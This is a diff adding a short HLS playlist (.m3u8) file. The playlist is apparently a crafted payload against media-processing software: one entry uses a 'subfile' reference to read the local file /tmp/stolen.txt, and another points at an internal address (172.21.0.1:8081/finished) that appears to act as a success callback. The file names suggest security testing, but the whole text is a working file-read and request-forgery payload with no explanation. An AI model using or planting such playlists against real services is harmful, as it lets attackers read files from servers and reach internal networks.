@@ -1,0 +1,6 @@
+#EXTM3U
+#EXT-X-MEDIA-SEQUENCE:0
+#EXTINF:10.0,
+subfile,,start,0,end,100,,:file:///tmp/stolen.txt
+#EXTINF:10.0,
+http://172.21.0.1:8081/finished
